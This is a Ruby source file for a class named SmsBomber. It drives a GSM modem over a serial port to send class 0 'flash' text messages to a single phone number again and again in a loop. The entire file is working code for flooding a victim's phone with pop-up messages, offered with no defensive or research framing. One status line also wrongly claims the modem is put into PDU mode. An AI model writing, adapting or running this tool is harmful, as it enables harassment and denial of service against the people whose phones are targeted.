require 'serialport'

class SmsBomber

  def initialize (modemAddress)
    @uart=SerialPort.new(modemAddress, 230400, 8, 1, SerialPort::NONE)
    @readingThread=Thread.new do
      while true do
        data=@uart.gets.chomp!
        if data.include? '+CMGS:'
          @modemBusy=false
          print "Sent!\n"
        end
      end
    end
    puts 'Initializing modem in pdu mode.... OK!'
  end

  def sendFlashSMS(phoneNumber, smsText, smsCount)
    @uart.write('AT+CSMP=17,167,0,16'+13.chr)
    puts 'Setting modem to send class 0 SMS... OK!'
    sleep(2)
    (0..smsCount).each do |i|
      print "Sending Message ##{i}"
      @modemBusy=true
      @uart.write("AT+CMGS=\"#{phoneNumber}\""+13.chr)
      sleep(0.1)
      @uart.write(smsText+26.chr+13.chr)
      while @modemBusy do
        print '.'
        sleep(0.3)
      end
    end
  end
  def dispose
    Thread.kill @readingThread
  end
end
